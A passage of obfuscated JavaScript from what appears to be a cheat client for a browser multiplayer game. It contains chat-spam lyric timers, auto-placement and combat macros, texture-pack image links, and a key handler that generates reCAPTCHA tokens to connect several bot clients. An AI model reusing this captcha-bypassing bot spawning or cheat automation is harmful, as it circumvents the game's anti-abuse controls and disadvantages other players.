{chat: "For the first time", delay: 173e3}, {chat: "I feel alive!", delay: 174e3}, {chat: "I can fly like an eagle,", delay: 177e3}, {chat: "and strike like a hawk!", delay: 178e3}, {chat: "Do you think you can survive", delay: 18e4}, {chat: "I came up from the bottom,", delay: 183e3}, {chat: "and into the top", delay: 184e3}, {chat: "For the first time", delay: 185e3}, {chat: "I feel alive!", delay: 186e3}, {chat: "I can fly like an eagle,", delay: 189e3}, {chat: "and strike like a hawk!", delay: 19e4}, {chat: "Do you think you can survive", delay: 192e3}, {chat: "the top?", delay: 194e3}, {chat: "I came up from the bottom,", delay: 23e4}, {chat: "and into the top", delay: 232e3}, {chat: "For the first time", delay: 233e3}, {chat: "I feel alive!", delay: 234e3}, {chat: "I can fly like an eagle,", delay: 237e3}, {chat: "and strike like a hawk!", delay: 238e3}, {chat: "Do you think you can survive", delay: 239e3}, {chat: "I came up from the bottom,", delay: 243e3}, {chat: "and into the top", delay: 244e3}, {chat: "For the first time", delay: 245e3}, {chat: "I feel alive!", delay: 246e3}, {chat: "I can fly like an eagle,", delay: 249e3}, {chat: "and strike like a hawk!", delay: 25e4}, {chat: "Do you think you can survive", delay: 252e3}, {chat: "the top?", delay: 255e3}];
    } else if (cS == 4) {
      cf = [{chat: "Here and now", delay: 12500}, {chat: "you're coming up to me", delay: 13e3}, {chat: "'Fore I'm lighting up the sky", delay: 15e3}, {chat: "Feel the ground", delay: 18e3}, {chat: "shaking underneath", delay: 19e3}, {chat: "Tryna take me alive", delay: 21e3}, {chat: "Get ready for the fallout", delay: 26e3}, {chat: "Can't stop me now", delay: 32e3}, {chat: "I got no rival", delay: 35e3}, {chat: "I'ma find my way", delay: 37e3}, {chat: "Through the blood and pain", delay: 39e3}, {chat: "Game of survival", delay: 41e3}, {chat: "Any time or place", delay: 43e3}, {chat: "Watch 'em run away", delay: 45e3}, {chat: "I got no-", delay: 47e3}, {chat: "I'll be standing on my own", delay: 48e3}, {chat: "Never gonna take my thrown", delay: 51e3}, {chat: "I got no rival", delay: 52e3}, {chat: "Watch 'em run away", delay: 55e3}, {chat: "I got no, no, no", delay: 57e3}, {chat: "I got no, no, no rival", delay: 58e3}, {chat: "No rival", delay: 71e3}, {chat: "No rival", delay: 77e3}];
    }
    JU = [];
    cf.forEach(cA => {
      JU.push(setTimeout(() => {
        if (document.activeElement.id.toLowerCase() !== "chatbox") {
          y4.send("ch", cA.chat);
        }
      }, cA.delay));
    });
    JG = setTimeout(() => {
      Jp = ![];
    }, cf[cf.length - 1].delay);
  }
  var Js = {w: ![], a: ![], s: ![], d: ![], y: 0, x: 0, aim: 0, status: !![], space: ![]}, Jp = ![], JU = [], JG = null;
  var Jq = ![], JP = ![];
  function Jg(cS, cf, cA) {
    let cY = ![], cb = undefined;
    return {start(cu) {
      if (cu == cS && document.activeElement.id.toLowerCase() !== "chatbox" && yI && yI.alive) {
        cY = !![];
        if (cb === undefined) {
          cb = setInterval(() => {
            cf();
            if (!cY) {
              clearInterval(cb);
              cb = undefined;
            }
          }, cA);
        }
      }
    }, stop(cu) {
      if (cu == cS && document.activeElement.id.toLowerCase() !== "chatbox") {
        cY = ![];
      }
    }};
  }
  const JH = Jg(81, () => {
    if (!TD) TR(yI.items[0]);
  }, 0);
  const JN = Jg(86, () => {
    if (!TD) TR(yI.items[2]);
  }, 0);
  const Jh = Jg(70, () => {
    if (yI.items[4] == 15) {
      if (!TD) TR(yI.items[4], J9() + c1(45));
      if (!TD) TR(yI.items[4], J9() - c1(45));
      if (!TD) TR(yI.items[4]);
    } else {
      if (!TD) TR(yI.items[4]);
    }
  }, 0);
  const JX = Jg(72, () => {
    for (let cS = 0; cS < Math.PI * 2; cS += Math.PI / 4) {
      if (!TD) TR(yI.items[5], cS);
    }
  }, 0);
  document.getElementById("gameCanvas").addEventListener("wheel", function (cS) {
    if (cS.deltaY > 0) {
      V2 *= 0.95;
      V3 *= 0.95;
    } else {
      V2 /= 0.95;
      V3 /= 0.95;
    }
    J3();
  });
  window.addEventListener("keydown", y5.checkTrusted(function (cS) {
    var cf = cS.which || cS.keyCode || 0;
    if (yI) {
      JH.start(cf);
      JX.start(cf);
      Jh.start(cf);
      JN.start(cf);
    }
    if (cS.key == "=" && yI && "chatbox" !== document.activeElement.id.toLowerCase()) {
      if (document.getElementById("doExternalVisuals").checked) {
        V2 = 1920;
        V3 = 1080;
      } else {
        V2 = y7.maxScreenWidth;
        V3 = y7.maxScreenHeight;
      }
      J3();
    }
    cS.key == "z" && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.status = !Js.status);
    84 == cf && yI && Ta == ![] && "chatbox" !== document.activeElement.id.toLowerCase() && (Jq = !![]);
    (cf == 87 || cf == 38) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.w = !![]);
    (cf == 65 || cf == 37) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.a = !![]);
    (cf == 83 || cf == 40) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.s = !![]);
    (cf == 68 || cf == 39) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.d = !![]);
    32 == cf && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.space = !![]);
    if (cS.key == "G" && yI && "chatbox" !== document.activeElement.id.toLowerCase()) {
      let cA = [];
      for (let cY = 0; cY < 3; cY++) {
        cA.push(grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", {action: "homepage"}));
      }
      Promise.all(cA).then(cb => {
        for (let cu = 0; cu < 3; cu++) {
          connectBot(cb[cu], cu);
        }
      });
    }
    if (cS.key == "Z" && yI && "chatbox" !== document.activeElement.id.toLowerCase()) {
      TB = [];
      nearestEnemy = [];
      TS = [];
      Ta = ![];
      JP = ![];
      df.change(![]);
      dA.change(![]);
      dY.change(![]);
      dv = ![];
      dS = ![];
      dp = [];
    }
    if (cS.keyCode == 190 && yI && document.getElementById("syncteam").checked && Ta == ![]) {
      if (nearestEnemy.length && yI.team && "chatbox" !== document.activeElement.id.toLowerCase()) {
        y4.send("14", 1);
      }
    }
    if (cS.key && cS.key == "C" && yI && "chatbox" !== document.activeElement.id.toLowerCase()) {
      if (Jp == ![]) {
        Jc[document.getElementById("chatType").value].currentTime = 0;
        JL(document.getElementById("chatType").value);
      } else {
        clearTimeout(JG);
        for (let cb = 0; cb < JU.length; cb++) {
          clearTimeout(JU[cb]);
        }
        for (let cu = 0; cu < Jc.length; cu++) {
          Jc[cu].pause();
          Jc[cu].currentTime = 0;
        }
      }
      Jp = !Jp;
    }
    27 == cf ? dx() : yI && yI.alive && JJ() && (Jy[cf] || (Jy[cf] = 1, 69 == cf ? y4.send("7", 1) : 67 == cf ? (dL || (dL = {}), dL.x = yI.x, dL.y = yI.y) : 143 == cf ? (yI.lockDir = yI.lockDir ? 0 : 1, y4.send("7", 0)) : null != yI.weapons[cf - 49] ? JE(yI.weapons[cf - 49], !0) : null != yI.items[cf - 49 - yI.weapons.length] ? JE(yI.items[cf - 49 - yI.weapons.length]) : 81 == cf ? JE(yI.items[0]) : 82 == cf ? JO() : JV[cf] ? JZ() : 32 == cf && (yE = 1)));
  })), window.addEventListener("keyup", y5.checkTrusted(function (cS) {
    if (yI && yI.alive) {
      var cf = cS.which || cS.keyCode || 0;
      JH.stop(cf);
      JX.stop(cf);
      Jh.stop(cf);
      JN.stop(cf);
      84 == cf && "chatbox" !== document.activeElement.id.toLowerCase() && (Jq = ![], y4.send("33", null));
      (cf == 87 || cf == 38) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.w = ![]);
      (cf == 65 || cf == 37) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.a = ![]);
      (cf == 83 || cf == 40) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.s = ![]);
      (cf == 68 || cf == 39) && yI && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.d = ![]);
      32 == cf && "chatbox" !== document.activeElement.id.toLowerCase() && (Js.space = ![]);
      13 == cf ? dm() : JJ() && Jy[cf] && (Jy[cf] = 0, JV[cf] ? JZ() : 32 == cf && (yE = 0));
    }
  }));
  var JF = void 0;
  function JZ() {
    var cS = function () {
      var cf = 0, cA = 0;
      if (-1 != yC.id) cf += yC.currentX - yC.startX, cA += yC.currentY - yC.startY; else for (var cY in JV) {
        var cb = JV[cY];
        cf += !!Jy[cY] * cb[0], cA += !!Jy[cY] * cb[1];
      }
      return 0 == cf && 0 == cA ? void 0 : y5.fixTo(Math.atan2(cA, cf), 2);
    }();
    if (JF == null || cS == null || Math.abs(cS - JF) > 0.3) {
      if (JP == ![]) {
        y4.send("33", cS);
        JF = cS;
      } else {
        y4.send("33", Tj);
      }
    }
  }
  var Jz = ![];
  function JO() {
    Jz = !Jz;
  }
  function JE(cS, cf) {
    y4.send("5", cS, cf);
  }
  var JI = !0;
  function JM(cS) {
    VH.style.display = "none", VP.style.display = "block", V5.style.display = "none", Jy = {}, yM = cS, yE = 0, V4 = !0, JI && (JI = !1, yQ.length = 0);
  }
  function JK(cS, cf, cA, cY) {
    yL.showText(cS, cf, 50, 0.18, document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 1 ? 2e3 : 500, Math.abs(cA), cA >= 0 ? "#fff" : "#8ecc51");
  }
  var Jr = 99999;
  function Jw() {
    V4 = !1;
    try {
      factorem.refreshAds([2], !0);
    } catch (cS) {}
    VN.style.display = "none", dx(), dT = {x: yI.x, y: yI.y}, VH.style.display = "none", VY.style.display = "block", VY.style.fontSize = "0px", Jr = 0, setTimeout(function () {
      VP.style.display = "block", V5.style.display = "block", VY.style.display = "none";
    }, y7.deathFadeout), d4();
  }
  function JR(cS) {
    yI && Va.removeAllItems(cS);
  }
  function Jv(cS) {
    let cf = cZ(cS);
    if (document.getElementById("autogrind").checked == ![]) {
      if (cf && Math.hypot(cf.y - yI.y2, cf.x - yI.x2) < 300 && document.getElementById("autoreplace").checked == !![]) {
        if (nearestEnemy.length && cN(nearestEnemy, yI) < 200) {
          if (cN(nearestEnemy, yI) < 140 && Ta == ![] && yI.primary.reload == 1 && yI.primary.dmg >= 40) {
            TR(yI.items[2], Math.hypot(cf.x - yI.x, cf.y - cf.y));
            Ta = !![];
            db(7, 0);
            db(yI.tails[21] ? 21 : 0, 1);
            dY.change(![]);
            JE(yI.weapons[0], !![]);
            dA.change(!![]);
            y4.send("7", 1);
            setTimeout(() => {
              y4.send("7", 1);
              dA.change(![]);
              dY.change(![]);
              Ta = ![];
            }, 240);
          } else {
            TR(yI.items[4], Math.hypot(cf.x - yI.x, cf.y - cf.y));
          }
          TR(yI.items[2], Tj);
          for (let cA = Tj - Math.PI / 3 + Math.PI; cA < Tj + Math.PI / 3 + Math.PI; cA += Math.PI / 18 + Math.PI) {
            TR(yI.items[2], cA);
          }
        }
        for (let cY = Tj - Math.PI / 3; cY < Tj + Math.PI / 3; cY += Math.PI / 16) {
          TR(yI.items[2], cY);
          TR(yI.items[2], -cY);
        }
        if (yI.items[4] == 15) {
          for (let cb = 0; cb < Math.PI * 2; cb += Math.PI / 12) {
            TR(yI.items[4], cb);
            TR(yI.items[4], -cb);
          }
        }
      }
    } else {
      if (Math.hypot(cf.y - yI.y2, cf.x - yI.x2) < 300) {
        for (let cu = 0; cu < Math.PI * 2; cu += Math.PI / 2) {
          TR(yI.items[5] ? yI.items[5] : yI.items[3], cu);
        }
      }
    }
    Va.disableBySid(cS);
  }
  function JS() {
    VF.innerText = yI.food;
    VZ.innerText = yI.wood;
    Vz.innerText = yI.stone;
    VX.innerText = yI.points;
    VO.innerText = yI.kills;
  }
  var Jf = {}, JA = ["crown", "skull", "crosshair"], JY = [];
  function Jb(cS, cf) {
    if (yI.upgradePoints = cS, yI.upgrAge = cf, cS > 0) {
      JY.length = 0, y5.removeAllChildren(Vw);
      for (var cA = 0; cA < y9.weapons.length; ++cA) y9.weapons[cA].age == cf && (y5.generateElement({id: "upgradeItem" + cA, class: "actionBarItem", onmouseout: function () {
        dJ();
      }, parent: Vw}).style.backgroundImage = document.getElementById("actionBarItem" + cA).style.backgroundImage, JY.push(cA));
      for (cA = 0; cA < y9.list.length; ++cA) if (y9.list[cA].age == cf) {
        var cY = y9.weapons.length + cA;
        y5.generateElement({id: "upgradeItem" + cY, class: "actionBarItem", onmouseout: function () {
          dJ();
        }, parent: Vw}).style.backgroundImage = document.getElementById("actionBarItem" + cY).style.backgroundImage, JY.push(cY);
      }
      for (cA = 0; cA < JY.length; cA++) !function (cb) {
        var cu = document.getElementById("upgradeItem" + cb);
        cu.onmouseover = function () {
          y9.weapons[cb] ? dJ(y9.weapons[cb], !0) : dJ(y9.list[cb - y9.weapons.length]);
        }, cu.onclick = y5.checkTrusted(function () {
          y4.send("6", cb);
        }), y5.hookTouchEvents(cu);
      }(JY[cA]);
      JY.length ? (Vw.style.display = "block", VR.style.display = "block", VR.innerHTML = "SELECT ITEMS (" + cS + ")") : (Vw.style.display = "none", VR.style.display = "none", dJ());
    } else Vw.style.display = "none", VR.style.display = "none", dJ();
  }
  function Ju(cS, cf, cA) {
    null != cS && (yI.XP = cS), null != cf && (yI.maxXP = cf), null != cA && (yI.age = cA), cA == y7.maxAge ? (VK.innerHTML = "MAX AGE", Vr.style.width = "100%") : (VK.innerHTML = "AGE " + yI.age, Vr.style.width = yI.XP / yI.maxXP * 100 + "%");
  }
  function Jx(cS) {
    y5.removeAllChildren(VE);
    for (var cf = 1, cA = 0; cA < cS.length; cA += 3) !function (cY) {
      y5.generateElement({class: "leaderHolder", parent: VE, children: [y5.generateElement({class: "leaderboardItem", style: "color:" + (cS[cY] == yM ? "#fff" : "rgba(255,255,255,0.6)"), text: cf + ". " + ("" != cS[cY + 1] ? cS[cY + 1] : "unknown")}), y5.generateElement({class: "leaderScore", text: y5.kFormat(cS[cY + 2]) || "0"})]});
    }(cA), cf++;
  }
  function Ji(cS, cf, cA, cY) {
    VL.save(), VL.setTransform(1, 0, 0, 1, 0, 0), VL.scale(yA, yA);
    var cb = 50;
    VL.beginPath(), VL.arc(cS, cf, cb, 0, 2 * Math.PI, !1), VL.closePath(), VL.fillStyle = "rgba(255, 255, 255, 0.3)", VL.fill(), cb = 50;
    var cu = cA - cS, cx = cY - cf, cQ = Math.sqrt(Math.pow(cu, 2) + Math.pow(cx, 2)), ck = cQ > cb ? cQ / cb : 1;
    cu /= ck, cx /= ck, VL.beginPath(), VL.arc(cS + cu, cf + cx, 0.5 * cb, 0, 2 * Math.PI, !1), VL.closePath(), VL.fillStyle = "white", VL.fill(), VL.restore();
  }
  function JQ(cS, cf, cA) {
    for (var cY = 0; cY < yk.length; ++cY) (yK = yk[cY]).active && yK.layer == cS && (yK.update(yZ), yK.active && TI(yK.x - cf, yK.y - cA, yK.scale) && (VL.save(), VL.translate(yK.x - cf, yK.y - cA), VL.rotate(yK.dir), Jl(0, 0, yK, VL, 1), VL.restore()));
  }
  var Jk = {};
  function Jl(cS, cf, cA, cY, cb) {
    if (cA.src) {
      var cu = y9.projectiles[cA.indx].src, cx = Jk[cu];
      cx || ((cx = new Image).onload = function () {
        this.isLoaded = !0;
      }, cx.src = ".././img/weapons/" + cu + ".png", Jk[cu] = cx), cx.isLoaded && cY.drawImage(cx, cS - cA.scale / 2, cf - cA.scale / 2, cA.scale, cA.scale);
    } else 1 == cA.indx && (cY.fillStyle = "#939393", TL(cS, cf, cA.scale, cY));
  }
  function Ja(cS, cf, cA, cY) {
    var cb = y7.riverWidth + cY, cu = y7.mapScale / 2 - cf - cb / 2;
    cu < V3 && cu + cb > 0 && cA.fillRect(0, cu, V2, cb);
  }
  function Jo(cS, cf, cA) {
    for (var cY, cb, cu, cx = 0; cx < yQ.length; ++cx) (yK = yQ[cx]).active && (cb = yK.x + yK.xWiggle - cf, cu = yK.y + yK.yWiggle - cA, 0 == cS && yK.update(yZ), yK.layer == cS && TI(cb, cu, yK.scale + (yK.blocker || 0)) && (VL.globalAlpha = yK.hideFromEnemy ? 0.6 : 1, yK.isItem ? (cY = Tc(yK), VL.save(), VL.translate(cb, cu), VL.rotate(VL.rotate(Math.atan2(Math.sin(yK.dir), Math.cos(yK.dir)))), VL.drawImage(cY, -cY.width / 2, -cY.height / 2), yK.blocker && (VL.strokeStyle = "#db6e6e", VL.globalAlpha = 0.3, VL.lineWidth = 6, TL(0, 0, yK.blocker, VL, !1, !0)), VL.restore()) : (cY = TJ(yK), VL.drawImage(cY, cb - cY.width / 2, cu - cY.height / 2))));
  }
  var JD = [];
  function JW(cS) {
    for (let cf = 0; cf < JD.length; cf++) JD[cf](cS);
    JD = [];
  }
  function Jm() {
    return new Promise(function (cS, cf) {
      JD.push(cS), setTimeout(function () {
        cf();
      }, 50);
    });
  }
  function JB(cS, cf, cA) {
    let cY = cX(cS).skinIndex == 40 ? 3.3 : 1;
    let cb = y9.weapons[cA].dmg * (cA == 10 ? 7.5 : 1) * cY;
    (yK = cX(cS)) && (yK.startAnim(cf, cA), JW(cb));
  }
  function Jj() {
    let cS = yI.weapons[1] == 10 ? 10 : yI.weapons[0];
    if (Ta == !![]) {
      return Tj;
    } else if (TD == !![]) {
      if (TC == Number.MAX_VALUE) {
        return Math.atan2(yj - yS / 2, yB - yv / 2);
      } else {
        if (cS == 10 ? yI.secondary.reload == 1 : yI.primary.reload == 1) {
          return TC;
        } else {
          return Math.atan2(yj - yS / 2, yB - yv / 2);
        }
      }
    } else if (yI.primary.reload == 1 && (c0 == "auto bull spam" || c0 == "oneticking")) {
      return Tj;
    } else {
      return Math.atan2(yj - yS / 2, yB - yv / 2);
    }
  }
  function JC(cS, cf, cA) {
    VL.globalAlpha = 1;
    for (var cY = 0; cY < yu.length; cY++) {
      yK = yu[cY];
      if (yK.zIndex == cA) {
        yK.animate(yZ);
        if (yK.visible) {
          yK.skinRot += 0.002 * yZ;
          let cb = document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0 ? !![] : ![];
          let cu = document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 1 ? !![] : ![];
          yR = (yK == yI && cu == !![] ? Jj() : yK == yI && cb == ![] ? Math.atan2(yj - yS / 2, yB - yv / 2) : yK.dir) + yK.dirPlus;
          VL.save();
          VL.translate(yK.x - cS, yK.y - cf);
          VL.rotate(yR);
          if (yK == yI) {
            let cx = yI.weapons[1] == 10 ? 10 : yI.weapons[0];
            if (cu == !![] && (cx == 10 ? yI.secondary.reload == 1 : yI.primary.reload == 1) && (TD == !![] || J6.status == !![]) && J8 == !![] && !document.getElementById("autogrind").checked) {} else {
              T4(yK, VL);
            }
          } else {
            T4(yK, VL);
          }
          VL.restore();
        }
      }
    }
  }
  var T0 = {7: "https://i.imgur.com/vAOzlyY.png", 15: "https://i.imgur.com/YRQ8Ybq.png", 11: "https://i.imgur.com/yfqME8H.png", 12: "https://i.imgur.com/VSUId2s.png", 40: "https://i.imgur.com/Xzmg27N.png", 26: "https://i.imgur.com/I0xGtyZ.png", 6: "https://i.imgur.com/vM9Ri8g.png"};
  var T1 = {18: "https://i.imgur.com/0rmN7L9.png", 21: "https://i.imgur.com/4ddZert.png"};
  var T2 = {samurai_1: "https://i.imgur.com/mbDE77n.png", samurai_1_g: "https://cdn.discordapp.com/attachments/967213871267971072/1030852038948552724/image.png"};
  function T3(cS, cf) {
    if (document.getElementById("textpack").checked) {
      if (T0[cS] && cf == "hat") {
        return T0[cS];
      } else if (T1[cS] && cf == "acc") {
        return T1[cS];
      } else if (T2[cS] && cf == "weapons") {
        return T2[cS];
      } else {
        if (cf == "acc") {
          return ".././img/accessories/access_" + cS + ".png";
        } else if (cf == "hat") {
          return ".././img/hats/hat_" + cS + ".png";
        } else {
          return ".././img/weapons/" + cS + ".png";
        }
      }
    } else {
      if (cf == "acc") {
        return ".././img/accessories/access_" + cS + ".png";
      } else if (cf == "hat") {
        return ".././img/hats/hat_" + cS + ".png";
      } else {
        return ".././img/weapons/" + cS + ".png";
      }
    }
  }
  function T4(cS, cf) {
    (cf = cf || VL).lineWidth = 5.5, cf.lineJoin = "miter";
    var cA = Math.PI / 4 * (y9.weapons[cS.weaponIndex].armS || 1), cY = cS.buildIndex < 0 && y9.weapons[cS.weaponIndex].hndS || 1, cb = cS.buildIndex < 0 && y9.weapons[cS.weaponIndex].hndD || 1;
    if (cS.tailIndex > 0 && function (cx, cQ, ck) {
      if (!(T5 = T8[cx + (document.getElementById("textpack").checked ? "lol" : 0)])) {
        var cl = new Image;
        cl.onload = function () {
          this.isLoaded = !0, this.onload = null;
        }, cl.src = T3(cx, "acc"), T8[cx + (document.getElementById("textpack").checked ? "lol" : 0)] = cl, T5 = cl;
      }
      var ca = T9[cx];
      if (!ca) {
        for (var co = 0; co < Vl.length; ++co) if (Vl[co].id == cx) {
          ca = Vl[co];
          break;
        }
        T9[cx] = ca;
      }
      T5.isLoaded && (cQ.save(), cQ.translate(-20 - (ca.xOff || 0), 0), ca.spin && cQ.rotate(ck.skinRot), cQ.drawImage(T5, -ca.scale / 2, -ca.scale / 2, ca.scale, ca.scale), cQ.restore());
    }(cS.tailIndex, cf, cS), cS.buildIndex < 0 && !y9.weapons[cS.weaponIndex].aboveHand && (TV(y9.weapons[cS.weaponIndex], y7.weaponVariants[cS.weaponVariant].src, cS.scale, 0, cf), null == y9.weapons[cS.weaponIndex].projectile || y9.weapons[cS.weaponIndex].hideProjectile || Jl(cS.scale, 0, y9.projectiles[y9.weapons[cS.weaponIndex].projectile], VL)), cf.fillStyle = y7.skinColors[cS.skinColor], TL(cS.scale * Math.cos(cA), cS.scale * Math.sin(cA), 14), TL(cS.scale * cb * Math.cos(-cA * cY), cS.scale * cb * Math.sin(-cA * cY), 14), cS.buildIndex < 0 && y9.weapons[cS.weaponIndex].aboveHand && (TV(y9.weapons[cS.weaponIndex], y7.weaponVariants[cS.weaponVariant].src, cS.scale, 0, cf), null == y9.weapons[cS.weaponIndex].projectile || y9.weapons[cS.weaponIndex].hideProjectile || Jl(cS.scale, 0, y9.projectiles[y9.weapons[cS.weaponIndex].projectile], VL)), cS.buildIndex >= 0) {
      var cu = Tc(y9.list[cS.buildIndex]);
      cf.drawImage(cu, cS.scale - y9.list[cS.buildIndex].holdOffset, -cu.width / 2);
    }
    TL(0, 0, cS.scale, cf), cS.skinIndex > 0 && (cf.rotate(Math.PI / 2), function cx(cQ, ck, cl, ca) {
      if (!(T5 = T6[cQ + (document.getElementById("textpack").checked ? "lol" : 0)])) {
        var co = new Image;
        co.onload = function () {
          this.isLoaded = !0, this.onload = null;
        }, co.src = T3(cQ, "hat"), T6[cQ + (document.getElementById("textpack").checked ? "lol" : 0)] = co, T5 = co;
      }
      var cD = cl || T7[cQ];
      if (!cD) {
        for (var cW = 0; cW < Vk.length; ++cW) if (Vk[cW].id == cQ) {
          cD = Vk[cW];
          break;
        }
        T7[cQ] = cD;
      }
      T5.isLoaded && ck.drawImage(T5, -cD.scale / 2, -cD.scale / 2, cD.scale, cD.scale), !cl && cD.topSprite && (ck.save(), ck.rotate(ca.skinRot), cx(cQ + "_top", ck, cD, ca), ck.restore());
    }(cS.skinIndex, cf, null, cS));
  }
  var T5, T6 = {}, T7 = {}, T8 = {}, T9 = {}, Ty = {};
  function TV(cS, cf, cA, cY, cb) {
    var cu = cS.src + (cf || ""), cx = Ty[cu + (document.getElementById("textpack").checked ? "lol" : 0)];
    cx || ((cx = new Image).onload = function () {
      this.isLoaded = !0;
    }, cx.src = T3(cu, "weapons"), Ty[cu + (document.getElementById("textpack").checked ? "lol" : 0)] = cx), cx.isLoaded && cb.drawImage(cx, cA + cS.xOff - cS.length / 2, cY + cS.yOff - cS.width / 2, cS.length, cS.width);
  }
  var Td = {};
  function TJ(cS) {
    var cf = cS.y >= y7.mapScale - y7.snowBiomeTop ? 2 : cS.y <= y7.snowBiomeTop ? 1 : 0, cA = cS.type + "_" + cS.scale + "_" + cf, cY = Td[cA];
    if (!cY) {
      var cb = document.createElement("canvas");
      cb.width = cb.height = 2.1 * cS.scale + 5.5;
      var cu = cb.getContext("2d");
      if (cu.translate(cb.width / 2, cb.height / 2), cu.rotate(y5.randFloat(0, Math.PI)), cu.strokeStyle = Vo, cu.lineWidth = 5.5, 0 == cS.type) for (var cx, cQ = 0; cQ < 2; ++cQ) Ts(cu, 7, cx = yK.scale * (cQ ? 0.5 : 1), 0.7 * cx), cu.fillStyle = cf ? cQ ? "#fff" : "#e3f1f4" : cQ ? "#b4db62" : "#9ebf57", cu.fill(), cQ || cu.stroke(); else if (1 == cS.type) if (2 == cf) cu.fillStyle = "#606060", Ts(cu, 6, 0.3 * cS.scale, 0.71 * cS.scale), cu.fill(), cu.stroke(), cu.fillStyle = "#89a54c", TL(0, 0, 0.55 * cS.scale, cu), cu.fillStyle = "#a5c65b", TL(0, 0, 0.3 * cS.scale, cu, !0); else {
        var ck;
        !function (ca, co, cD, cW) {
          var cm, cB = Math.PI / 2 * 3, cj = Math.PI / 6;
          ca.beginPath(), ca.moveTo(0, -cW);
          for (var cC = 0; cC < 6; cC++) cm = y5.randInt(cD + 0.9, 1.2 * cD), ca.quadraticCurveTo(Math.cos(cB + cj) * cm, Math.sin(cB + cj) * cm, Math.cos(cB + 2 * cj) * cW, Math.sin(cB + 2 * cj) * cW), cB += 2 * cj;
          ca.lineTo(0, -cW), ca.closePath();
        }(cu, 0, yK.scale, 0.7 * yK.scale), cu.fillStyle = cf ? "#e3f1f4" : "#89a54c", cu.fill(), cu.stroke(), cu.fillStyle = cf ? "#6a64af" : "#c15555";
        var cl = yH / 4;
        for (cQ = 0; cQ < 4; ++cQ) TL((ck = y5.randInt(yK.scale / 3.5, yK.scale / 2.3)) * Math.cos(cl * cQ), ck * Math.sin(cl * cQ), y5.randInt(10, 12), cu);
      } else 2 != cS.type && 3 != cS.type || (cu.fillStyle = 2 == cS.type ? 2 == cf ? "#938d77" : "#939393" : "#e0c655", Ts(cu, 3, cS.scale, cS.scale), cu.fill(), cu.stroke(), cu.fillStyle = 2 == cS.type ? 2 == cf ? "#b2ab90" : "#bcbcbc" : "#ebdca3", Ts(cu, 3, 0.55 * cS.scale, 0.65 * cS.scale), cu.fill());
      cY = cb, Td[cA] = cY;
    }
    return cY;
  }
  var TT = [];
  function Tc(cS, cf) {
    var cA = TT[cS.id + (yI && cS.owner && cS.owner.sid == yI.sid ? 0 : yI && yI.team && cS.owner && isAlly(cS.owner.sid) ? 25 : 50)];
    if (!cA || cf) {
      var cY = document.createElement("canvas");
      cY.width = cY.height = 2.5 * cS.scale + 5.5 + (y9.list[cS.id].spritePadding || 0);
      var cb = cY.getContext("2d");
      if (cb.translate(cY.width / 2, cY.height / 2), cb.rotate(cf ? 0 : Math.PI / 2), cb.strokeStyle = Vo, cb.lineWidth = 5.5 * (cf ? cY.width / 81 : 1), "apple" == cS.name) {
        cb.fillStyle = "#c15555", TL(0, 0, cS.scale, cb), cb.fillStyle = "#89a54c";
        var cu = -Math.PI / 2;
        !function (cB, cj, cC, L0, L1) {
          var L2 = cB + 25 * Math.cos(L0), L3 = cj + 25 * Math.sin(L0);
          L1.moveTo(cB, cj), L1.beginPath(), L1.quadraticCurveTo((cB + L2) / 2 + 10 * Math.cos(L0 + Math.PI / 2), (cj + L3) / 2 + 10 * Math.sin(L0 + Math.PI / 2), L2, L3), L1.quadraticCurveTo((cB + L2) / 2 - 10 * Math.cos(L0 + Math.PI / 2), (cj + L3) / 2 - 10 * Math.sin(L0 + Math.PI / 2), cB, cj), L1.closePath(), L1.fill(), L1.stroke();
        }(cS.scale * Math.cos(cu), cS.scale * Math.sin(cu), 0, cu + Math.PI / 2, cb);
      } else if ("cookie" == cS.name) {
        cb.fillStyle = "#cca861", TL(0, 0, cS.scale, cb), cb.fillStyle = "#937c4b";
        for (var cx = yH / (ck = 4), cQ = 0; cQ < ck; ++cQ) TL((cl = y5.randInt(cS.scale / 2.5, cS.scale / 1.7)) * Math.cos(cx * cQ), cl * Math.sin(cx * cQ), y5.randInt(4, 5), cb, !0);
      } else if ("cheese" == cS.name) {
        var ck, cl;
        for (cb.fillStyle = "#f4f3ac", TL(0, 0, cS.scale, cb), cb.fillStyle = "#c3c28b", cx = yH / (ck = 4), cQ = 0; cQ < ck; ++cQ) TL((cl = y5.randInt(cS.scale / 2.5, cS.scale / 1.7)) * Math.cos(cx * cQ), cl * Math.sin(cx * cQ), y5.randInt(4, 5), cb, !0);
      } else if ("wood wall" == cS.name || "stone wall" == cS.name || "castle wall" == cS.name) {
        cb.fillStyle = "castle wall" == cS.name ? "#83898e" : "wood wall" == cS.name ? "#a5974c" : "#939393";
        var ca = "castle wall" == cS.name ? 4 : 3;
        Ts(cb, ca, 1.1 * cS.scale, 1.1 * cS.scale), cb.fill(), cb.stroke(), cb.fillStyle = "castle wall" == cS.name ? "#9da4aa" : "wood wall" == cS.name ? "#c9b758" : "#bcbcbc", Ts(cb, ca, 0.65 * cS.scale, 0.65 * cS.scale), cb.fill();
      } else if ("spikes" == cS.name || "greater spikes" == cS.name || "poison spikes" == cS.name || "spinning spikes" == cS.name) {
        cb.fillStyle = "poison spikes" == cS.name ? "#7b935d" : "#939393";
        var co = 0.6 * cS.scale;
        Ts(cb, "spikes" == cS.name ? 5 : 6, cS.scale, co), cb.fill(), cb.stroke(), cb.fillStyle = "#a5974c", TL(0, 0, co, cb), cb.fillStyle = "#c9b758", TL(0, 0, co / 2, cb, !0);
